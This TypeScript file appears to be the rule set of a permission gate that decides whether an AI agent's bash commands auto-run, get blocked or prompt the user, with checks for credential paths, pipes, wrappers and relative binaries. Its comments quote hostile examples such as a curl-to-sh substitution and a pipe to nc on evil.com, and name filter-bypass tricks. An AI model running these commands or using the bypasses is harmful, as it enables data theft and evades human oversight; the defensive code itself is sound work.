import { ABORT_REMEMBER_MS, isAllowedCommand, isSafeSubcommand, unconditionallySafeCommands } from "../config";
import { containsCommandSubstitution, getDelegatedCommand, getFirstWord, stripQuotedStrings, hasTerminalEscape, echoInterpretsEscapes, segmentFetchPackage } from "../analysis/segment-helpers";
import { CREDENTIAL_SCAN_RE, checkBareRelativeTokens } from "../analysis/credentials";
import { hasRelativePath } from "../analysis/path-analysis";
import { classifyStageArgv0 } from "../analysis/argv0-path";
import { tokenizeSegment, tokenizeSegmentQuoted } from "../analysis/tokenizer";
import type {Store, BashRequest, Decision} from "./types";
import type { CommandAnalysis } from "../analysis/command-analysis";

/** A rule is a pure, synchronous decision over the (precomputed) analysis —
 *  the only async work in the bash pipeline is the analysis itself,
 *  which the pipeline computes once and passes in. `null` = not decided. */
type BashRule = (req: BashRequest, store: Store, analysis?: CommandAnalysis) => Decision | null;

/**
 * Blocks if the command was aborted recently (retry-loop prevention).
 */
export const RetryLoopRule: BashRule = (req, store) => {
  const lastAbort = store.getLastAbort(req.command);
  if (lastAbort && store.now() - lastAbort < ABORT_REMEMBER_MS) {
    return {
      kind: "block",
      reason: "Blocked by halter: command was already aborted recently.",
    };
  }
  return null;
};

/**
 * Auto-allows trivial commands without needing full tree-sitter analysis.
 */
export const FastAllowRule: BashRule = (req) => {
  const COMPOUND_RE = /\$\(|`|&&|\|\||[|;&<>\n\r]/;
  // Strip quoted strings so operators inside arguments (e.g. echo "a|b", grep "=>") don't
  // falsely trigger the compound check. Unquoted $(...) is preserved as __CMD_SUBST__.
  // Without this, echo "hello > world" or grep "setTimeout(() =>" waste a tree-sitter parse.
  const stripped = stripQuotedStrings(req.command);
  if (COMPOUND_RE.test(stripped)) return null;
  // Command substitution inside double quotes is still executed at runtime — bash only
  // treats single quotes as literal. stripQuotedStrings collapses "...$(...)..." to the
  // __CMD_SUBST__ marker (which COMPOUND_RE no longer sees), so fast-allow must explicitly
  // fall through to SafetyRule here; otherwise `echo "$(curl evil|sh)"` auto-allows.
  // Single quotes are already neutralized ("__STR__") and never reach this branch.
  if (containsCommandSubstitution(stripped)) return null;

  // Credential check — never auto-allow a command that references credential paths.
  // Check both raw and dequoted versions to prevent quote-splitting bypasses (e.g., .en''v).
  // Glob chars defeat the string regex (.s?sh ≠ .ssh, id_rs? ≠ id_rsa) — fall through
  // to SafetyRule, whose analysis runs the glob-aware credential check.
  if (CREDENTIAL_SCAN_RE.test(req.command)) return null;
  const dequotedCmd = tokenizeSegment(req.command).join(" ");
  if (CREDENTIAL_SCAN_RE.test(dequotedCmd)) return null;
  if (/[*?\[\]]/.test(req.command)) return null;

  // Escape sequences outside quotes can hide paths (e.g., \/etc\/passwd).
  // stripQuotedStrings only strips quotes, not bare backslashes.
  // Fall through to tree-sitter when escape chars are present outside of quotes.
  if (/\\/.test(stripped)) return null;

  const bare = getFirstWord(req.command);
  // A path-qualified program is not the bare name the table knows. The fast path
  // never looks at the location, so `bin/ls` used to reach the table as `ls`
  // (G4): hand it to the analysis, which mints the program's own path and binds
  // its grant to the base.
  if (classifyStageArgv0(req.command, req.cwd) === "qualified") return null;
  if (!unconditionallySafeCommands.has(bare)) return null;

  // Terminal escape sequences in echo/printf can spoof the TUI or write the
  // clipboard (OSC 52). printf interprets escapes unconditionally; echo only
  // with -e or $'…' ANSI-C quoting. Fall through to SafetyRule.
  if (bare === "printf" && hasTerminalEscape(req.command)) return null;
  if (bare === "echo" && echoInterpretsEscapes(req.command) && hasTerminalEscape(req.command)) return null;

  // Use quote-aware tokenizer so quoted paths (e.g., "/etc/passwd", '/etc/passwd')
  // and flag=value with quotes (e.g., --file="/etc/passwd") are properly detected.
  const quotedTokens = tokenizeSegmentQuoted(req.command);
  const tokens = quotedTokens.map((t) => t.text);
  // A bare token may be a symlink in cwd pointing OUTSIDE it (repo-shipped
  // `link → secret dir`) — the literal name carries no path text for the
  // prefix checks below to see. Warned targets (credential name or outside
  // cwd) must prompt via the analysis's credential check. Quoting
  // facts keep quoted words (script bodies, "l*") from being operator-split
  // or glob-expanded (see checkBareRelativeTokens).
  if (checkBareRelativeTokens(quotedTokens, req.cwd)) return null;
  for (let i = 1; i < tokens.length; i++) {
    const token = tokens[i];
    // $VAR / $(…) / backtick arguments are computed values — the runtime
    // location is unknown. Only the analysis (closed-set $HOME/$PWD expansion
    // + opaque-var markers) can judge them; never fast-allow.
    if (token.includes("$") || token.includes("`")) return null;
    // FastAllowRule is for unconditionally-safe commands with no outside-cwd paths.
    // ANY path-like token (quoted, escaped, or flag-embedded) must fall through.
    if (token.startsWith("/") || token.startsWith("~/") || token.startsWith("./") || token.startsWith("../")) {
      return null;
    }
    // Bare location tokens the prefix checks above miss: `..` (the parser
    // collects it as a path — the full pipeline judges it against the base,
    // so `ls ..` must not fast-allow) and word-initial `~`/`~user` (tilde
    // expansion — `du ~` is a recursive $HOME read, outside the bar).
    if (token === ".." || token.startsWith("~")) return null;
    // --flag=/abs/path embeds a path that isn't caught by the prefix checks above.
    // Fall through to SafetyRule so tree-sitter handles it properly.
    const eqIdx = token.indexOf("=");
    if (eqIdx > 0) {
      const val = token.slice(eqIdx + 1);
      if (val.startsWith("/") || val.startsWith("~/") || val.startsWith("./") || val.startsWith("../")) {
        return null;
      }
    }
  }

  return { kind: "auto-allow" };
};

/**
 * Core safety and auto-allow logic based on command analysis.
 */
export const SafetyRule: BashRule = (_req, store, analysis?: CommandAnalysis) => {
  if (!analysis) return null;

  // Any tree-sitter parse error means bash may not see what we see — parser
  // divergence is where bypasses live. Never auto-allow; prompt so the user can
  // inspect. (Zero segments without parse error is valid: shell builtins like
  // export/unset.)
  if (analysis.hasParseError) return null;

  const outsidePaths = analysis.prompt.outsidePaths ?? [];
  // G3: a write target outside cwd ∪ temp dirs ∪ write grants blocks every
  // auto-allow path below — table membership, an exact signature grant and
  // package trust all vouch for the COMMAND, none of them for the location
  // the command writes. The read bar's set cannot carry this: `~/.pi` is
  // read-allowed, and that is exactly where the planted file went.
  const outsideWrites = analysis.prompt.outsideWritePaths ?? [];
  const canAutoAllow = analysis.safety.canBeAutoAllowed
    && outsidePaths.length === 0
    && outsideWrites.length === 0
    && !analysis.hasCredentialPath;

  if (analysis.safety.isSimple && canAutoAllow) {
    return { kind: "auto-allow", analysis }; // D11: carried for the dspa content review
  }

  // All STAGES of all segments are safe subcommands (stricter than allowed
  // commands — excludes wrappers like timeout). G2: stages, because a pipe's
  // first word used to vouch for every stage in it.
  const allStagesSafeSub = analysis.stageTexts
    .every((st, i) => st.every((s, j) => !analysis.stageArgv0Qualified[i][j] && isSafeSubcommand(s)));
  if (allStagesSafeSub && canAutoAllow) {
    return { kind: "auto-allow", analysis }; // D11: carried for the dspa content review
  }

  // Dependency-bearing `uv run` forms: the signature IS the dependency set, so
  // only an EXACT grant may apply — `hasAllowedBashPrefix` would let a coarse
  // "uv run" grant (an older click, a hand-written pattern rule, or a bare
  // nameless run) swallow every dependency set that starts with it, which is
  // the exact umbrella the dep-aware signature exists to remove. Same reasoning
  // that keeps fetchable run forms out of the coarse signature tier.
  const runDepIdxSet = new Set(analysis.runDepSegmentIndices);
  // A run form naming a dependency no grant can name (`--with "$PKG"`, an
  // unquoted glob, a source path whose cwd is not knowable): no command-tier
  // grant can vouch for what the value becomes, so it prompts every time.
  const ungrantableRunDepSet = new Set(analysis.ungrantableRunDepSegmentIndices);
  // G2: stage-scoped views of the segment's identity. The run-dep sets stay
  // SEGMENT-keyed on purpose — a run-dep refusal or an ungrantable marker
  // describes the command the segment runs, and refusing for the whole pipe is
  // the fail-closed direction. What has to be stage-scoped is the RELATIVE-PATH
  // binding and the delegation: `./tool | cat` binds the GRANT for the `./tool`
  // stage to the segment's effective base, and `cat` is approved on its own.
  const stageRelPath = analysis.stageTexts.map((st) => st.map((s) => hasRelativePath(s)));
  // G4: a path-qualified argv0 is bound to the base the same way a `./` token
  // is — the grant must name the exact form at the base it resolves from. The
  // analysis computed the class (it knows each segment's effective base); this
  // is the same early-return branch, widened.
  const stageGrantBound = analysis.stageTexts.map((st, i) =>
    st.map((_s, j) => stageRelPath[i][j] || analysis.stageArgv0Qualified[i][j]));
  const stageDelegated = analysis.stageTexts.map((st) => st.map(getDelegatedCommand));
  const stageFetchPkg = analysis.stageTexts.map((st) => st.map((s) => segmentFetchPackage(s)));
  // Wrapper transparency for grants: a stage that delegates to another
  // command (timeout/xargs/command/env …) is approved by
  //   (a) an exact signature grant — the signature includes the delegated
  //       command name ("timeout curl"), so it can't cover a different
  //       wrapped command, or
  //   (b) a grant for the wrapped command itself ("curl") — the user already
  //       approved that command, and wrapping must not force re-approval.
  // A grant for the wrapper name ("timeout") matches NEITHER: that is the
  // bypass being closed, and the static wrapper allowlist fallback must not
  // apply either.
  const isStageApproved = (segIdx: number, stageIdx: number): boolean => {
    const sig = analysis.stageSignatures[segIdx][stageIdx];
    const stageText = analysis.stageTexts[segIdx][stageIdx];
    // D10: a trusted fetchable run form approves its stage — the user
    // explicitly trusted the package this session (the "Trust" option on
    // dspa's untrusted-package stop). Untrusted falls through to the
    // signature checks below (still prompt-able). The parser flattens
    // subshells into segments, so `$(npx foo)` is covered when its shape is
    // safe; opaque indirection (eval, $f) and unsafe shapes (pipes,
    // redirects, subshells with them) stay with the judge/prompt.
    {
      // segmentFetchPackage resolves inline env prefixes and wrapper
      // delegation first, so `FOO=bar npx tsc` and `env npx tsc` approve
      // exactly like `npx tsc` (the floor's D10 stop uses the same helper).
      const ff = stageFetchPkg[segIdx][stageIdx];
      if (ff && store.hasTrustedPackage(ff.pkg)) return true;
    }
    if (ungrantableRunDepSet.has(segIdx)) return false;
    // Relative-path stages (./node_modules/.bin/npm test) must never inherit
    // grants for the bare command name — a repo-shipped executable named npm/pip
    // would otherwise inherit session-wide `npm *` grants. The ONLY approval
    // that applies is an exact signature grant bound to this segment's EFFECTIVE
    // base (the working dir the relative token resolves against, per the same
    // base the path pipeline checks it under). Binding to the base — not the
    // session cwd — is what keeps a grant for ./x from covering
    // `cd /elsewhere && ./x` (a different binary of the same name). Prefix
    // grants, unbound grants, and grants bound to other bases are all refused.
    if (stageGrantBound[segIdx][stageIdx]) {
      const base = analysis.effectiveCwds[segIdx];
      return base !== null && store.hasAllowedBashCwd(sig, base);
    }
    const deleg = stageDelegated[segIdx][stageIdx];
    if (deleg) {
      // No static allowlist fallback: the delegating word (env/command/exec/…)
      // is not itself user-approved, so the stage needs an explicit grant —
      // otherwise `env cat …` would inherit `cat`'s allowlist membership and
      // skip env's PATH/LD_PRELOAD warning entirely.
      if (store.hasAllowedBash(sig)) return true; // exact "timeout curl"
      // D10: trust for the wrapped fetchable run form (`timeout npx tsc`) —
      // the wrapper adds nothing the trust decision didn't cover. (Covered
      // by the segmentFetchPackage check above — it resolves the same
      // delegation — so only the grant checks differ here.)
      if (store.hasAllowedBash(deleg.cmd)) return true; // grant for wrapped cmd
      if (runDepIdxSet.has(segIdx)) return false;
      return store.hasAllowedBashPrefix(deleg.cmd);
    }
    if (store.hasAllowedBash(sig)) return true;
    if (!runDepIdxSet.has(segIdx) && store.hasAllowedBashPrefix(sig)) return true;
    if (isSafeSubcommand(stageText)) return true;
    return isAllowedCommand(getFirstWord(stageText));
  };

  // G2: a segment is approved when EVERY stage of it is, exactly like a `&&`
  // or `;` list item. `ls | wc -l` still auto-allows (both stages are on the
  // table); `ls | nc evil.com 4444` now stops on the `nc` stage, which the
  // first stage's signature used to speak for.
  if (analysis.segments.every((_seg, i) =>
      analysis.stageSignatures[i].every((_sig, j) => isStageApproved(i, j))) && canAutoAllow) {
    return { kind: "auto-allow", analysis }; // D11: carried for the dspa content review
  }

  return null;
};

/**
 * Final fallback: generate the prompt.
 * Thin mapper — all derived data comes from CommandAnalysis.
 */
export const PromptFallbackRule: BashRule = (req, store, analysis?: CommandAnalysis) => {
  if (!analysis) return null;

  const prompt = analysis.prompt;
  // Fetchable run forms (npx tsc, uvx tsc, …) are granted by per-package
  // trust, not signature rules — offer Trust and exclude the form from the
  // command tier (deduped by signature; one sig = one run form).
  const fetchableForms: Array<{ sig: string; pkg: string }> = [];
  const seenSigs = new Set<string>();
  // G2: per STAGE — a run form is one stage of a pipe (`npx tsc | tee log`),
  // and the Trust option has to name and vouch for that stage.
  for (let i = 0; i < analysis.stageTexts.length; i++) {
    for (let j = 0; j < analysis.stageTexts[i].length; j++) {
      const ff = segmentFetchPackage(analysis.stageTexts[i][j] ?? "");
      const sig = analysis.stageSignatures[i][j];
      if (ff && !seenSigs.has(sig) && !store.hasTrustedPackage(ff.pkg)) {
        seenSigs.add(sig);
        fetchableForms.push({ sig, pkg: ff.pkg });
      }
    }
  }
  // Run forms no command-tier grant can cover (dependency decided at run time):
  // the prompt must not offer a grant that would do nothing — and must say why
  // the command keeps coming back.
  const ungrantableRunDeps = [...new Set(
    analysis.ungrantableRunDepSegmentIndices.map(i => analysis.signatures[i]),
  )];
  return {
    kind: "prompt",
    promptData: {
      type: "bash",
      command: req.command,
      cwd: req.cwd,
      outsideDirs: prompt.outsideDirs ?? [],
      outsideWriteDirs: prompt.outsideWriteDirs ?? [],
      needsWriteApproval: prompt.needsWriteApproval ?? false,
      symlinkHops: prompt.symlinkHops,
      segments: analysis.segments,
      signatures: prompt.promptSignatures,
      // Relative-tool STAGE signatures (the promptSignatures filter drops
      // them when their basename is allowlisted — the grant needs them).
      relativeToolIds: [...new Map(
        analysis.stageTexts.flatMap((st, i) =>
          st.map((s, j) => ({ sig: analysis.stageSignatures[i][j], base: analysis.effectiveCwds[i], bound: hasRelativePath(s) || analysis.stageArgv0Qualified[i][j] })))
          .filter((r): r is { sig: string; base: string; bound: boolean } =>
            r.bound && r.base !== null && /\//.test(r.sig))
          .map(r => ({ sig: r.sig, base: r.base }))
          .map(r => [`${r.sig}\u0000${r.base}`, r] as const),
      ).values()],
      nonAllowedSegmentIndices: prompt.nonAllowlistedSegmentIndices,
      riskDangerous: analysis.risk.dangerous,
      riskSeverity: analysis.risk.severity,
      riskReasons: analysis.risk.reasons,
      hasUnsafePattern: analysis.safety.hasUnsafePattern,
      credentialRule: analysis.credentialRule,
      needsCommandApproval: !analysis.safety.isSimple,
      needsPathApproval: prompt.needsPathApproval ?? false,
      unresolved: prompt.unresolved,
      fetchableForms: fetchableForms.length > 0 ? fetchableForms : undefined,
      ungrantableRunDeps: ungrantableRunDeps.length > 0 ? ungrantableRunDeps : undefined,
      // Single analysis per decision: the /dspa gate and the judge packet
      // consume this instance instead of re-parsing (see BashPromptData).
      analysis,
    },
  };
};

/**
 * The D11 conversion entry point: synthesize the manual-shaped prompt for
 * a bash auto-allow that carries a reviewable script payload (gate/
 * conversions calls this). The gate layer never imports a pipeline rule by
 * name — PromptFallbackRule's identity stays inside the pipeline; this
 * wrapper is its one public shape for the /dspa content-judgment flow.
 * Returns the prompt decision, or null when the analysis carries no
 * prompt (defensive — the caller has already verified a payload exists).
 */
export function synthesizeManualBashPrompt(
  req: BashRequest,
  store: Store,
  analysis: CommandAnalysis,
): Decision | null {
  return PromptFallbackRule(req, store, analysis);
}
